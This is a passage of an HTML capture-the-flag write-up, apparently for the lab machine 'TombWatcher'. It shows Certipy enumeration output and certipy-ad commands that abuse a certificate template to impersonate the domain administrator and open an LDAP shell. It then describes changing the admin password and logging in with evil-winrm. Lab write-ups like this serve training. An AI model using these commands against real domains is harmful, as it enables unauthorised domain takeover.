+[!] Failed <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> remote registry.<span class="hljs-built_in"> Service </span>should be starting now. Trying again<span class="hljs-built_in">..</span>.
+[*] Got CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">'tombwatcher-CA-1'</span>
+[*] Saved BloodHound data <span class="hljs-keyword">to</span> <span class="hljs-string">'20250812105044_Certipy.zip'</span>. Drag <span class="hljs-keyword">and</span> drop the file into the BloodHound GUI <span class="hljs-keyword">from</span> @ly4k
+[*] Saved text output <span class="hljs-keyword">to</span> <span class="hljs-string">'20250812105044_Certipy.txt'</span>
+[*] Saved JSON output <span class="hljs-keyword">to</span> <span class="hljs-string">'20250812105044_Certipy.json'</span></code></pre></div>
+<p>We find some ESC codes.</p>
+<p><img src="/_resources/6c1b6eec017d4d57b1a3c9d32ee2718f.png" /></p>
+<p>We check with the wiki.</p>
+<p><a title="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation" href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation</a></p>
+<div><pre class="hljs"><code>certipy-ad req -u <span class="hljs-symbol">'cert_admin</span><span class="hljs-meta">@tombwatcher</span>.htb' -p <span class="hljs-symbol">'Password</span>1' -dc-ip <span class="hljs-symbol">'10</span><span class="hljs-number">.129</span><span class="hljs-number">.232</span><span class="hljs-number">.167</span>' -target <span class="hljs-symbol">'DC01</span>.tombwatcher.htb' -ca <span class="hljs-symbol">'tombwatcher</span>-<span class="hljs-type">CA</span><span class="hljs-number">-1</span>' -template <span class="hljs-symbol">'WebServe</span>r' -upn <span class="hljs-symbol">'administrator</span><span class="hljs-meta">@tombwatcher</span>.htb' -application-policies <span class="hljs-symbol">'Client</span> <span class="hljs-type">Authentication</span>'
+
+certipy-ad auth -pfx <span class="hljs-symbol">'administrator</span>.pfx' -dc-ip <span class="hljs-symbol">'10</span><span class="hljs-number">.129</span><span class="hljs-number">.232</span><span class="hljs-number">.167</span>' -ldap-shell</code></pre></div>
+<p>We can then change password for admin.</p>
+<p><img src="/_resources/fd1ac01ad6e7418c8f15bced5cf3e7f9.png" /></p>
+<p>Then we can login into admin using evilwin-rm</p>
+<p><img src="/_resources/2a492e8b1b284225a5ea5150a46f49c2.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
